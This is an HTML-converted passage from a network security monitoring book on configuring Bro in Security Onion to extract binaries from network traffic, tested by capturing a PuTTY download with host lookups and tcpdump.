<p class="calibre1">Listing 12-4, replacing HTTP with SMTP. Support for extracting binaries from </p>
<p class="calibre1">Internet Relay Chat (IRC) is possible using the same method. To extract </p>
<p class="calibre1">more than Windows executables, you could alter u and v so that the </p>
<p class="calibre1">application portions read as follows:</p>
<p class="calibre1">/application\/.*/; </p>
<p class="calibre1">Replacing x-dosexec with .* tells Bro to extract any application type it </p>
<p class="calibre1">recognizes. You should not run this sort of configuration in production </p>
<p class="calibre1">because you could overload your sensor as it tries to rebuild and write every-</p>
<p class="calibre1">thing Bro recognizes. Use /application\/.*/; only to process saved traces </p>
<p class="calibre1">with limited amounts of traffic. </p>
<p class="calibre1">Now that we’ve altered Bro’s  <i class="calibre4">local.bro</i> policy script, let’s test our new </p>
<p class="calibre1">functionality. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Col ecting Traffic to Test Bro</b></i></p>
<p class="calibre1">When adding new capabilities to Bro and your SO installation, you should </p>
<p class="calibre1">test the changes manually before committing them. Bro allows you to run </p>
<p class="calibre1">policy scripts and other functionality against saved traffic, and we’ll do this </p>
<p class="calibre1">to test its newly configured ability to extract binaries from packets. </p>
<p class="calibre1">To provide the traffic for this test, we will download the Windows SSH </p>
<p class="calibre1">client PuTTY via HTTP and FTP. The PuTTY website ( <i class="calibre4">http://www.chiark </i></p>
<p class="calibre1"> <i class="calibre4">.greenend.org.uk/~sgtatham/putty/download.html</i>) provides links for download-</p>
<p class="calibre1">ing PuTTY via HTTP ( <i class="calibre4">http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe</i>) and FTP ( <i class="calibre4">ftp://ftp.chiark.greenend.org.uk/users/sgtatham/putty-latest/x86/putty </i></p>
<p class="calibre1"> <i class="calibre4">.exe</i>), giving us ways to test the capabilities we added to Bro. To save the traffic for the test, we will determine the IP addresses of the two servers hosting </p>
<p class="calibre1"> <i class="calibre4">putty .exe</i> via HTTP ( <i class="calibre4">the.earth.li</i>) and FTP ( <i class="calibre4">ftp.chiark.greenend.org.uk</i>), as shown in Listing 12-5, using the Linux host command in a terminal window. </p>
<p class="calibre1">Extending SO   <b class="calibre3">267</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p302"/><img src="index-302_1.png" alt="Image 148" class="calibre2"/></p>
<p class="calibre1">$ <b class="calibre3">host the.earth.li</b></p>
<p class="calibre1">the.earth.li has address 46.43.34.31u</p>
<p class="calibre1">the.earth.li has IPv6 address 2001:41c8:10:b1f:c0ff:ee:15:900d</p>
<p class="calibre1">the.earth.li mail is handled by 10 mail.the.earth.li. </p>
<p class="calibre1">$ <b class="calibre3">host ftp.chiark.greenend.org.uk</b></p>
<p class="calibre1">ftp.chiark.greenend.org.uk is an alias for service-name.chiark.greenend.org. </p>
<p class="calibre1">uk. </p>
<p class="calibre1">service-name.chiark.greenend.org.uk has address 212.13.197.229v</p>
<p class="calibre1">service-name.chiark.greenend.org.uk mail is handled by 0 . </p>
<p class="calibre1"> <i class="calibre4">Listing 12-5: Determining the IP addresses for HTTP and FTP download servers</i></p>
<p class="calibre1">Next, we run two instances of Tcpdump: one configured to log traffic </p>
<p class="calibre1">to and from the HTTP server at 46.43.34.31 u, and another to log traffic to </p>
<p class="calibre1">and from the FTP server at 212.13.197.229 v. Be sure to run the first com-</p>
<p class="calibre1">mand in one terminal, for the HTTP traffic:</p>
<p class="calibre1">$ <b class="calibre3">sudo tcpdump -n -i eth0 -w http-putty.pcap -s 0 host 46.43.34.31</b></p>
<p class="calibre1">Run the second command in another terminal, for the FTP traffic:</p>
<p class="calibre1">$ <b class="calibre3">sudo tcpdump -n -i eth0 -w ftp-putty.pcap -s 0 host 212.13.197.229</b></p>
</body></html>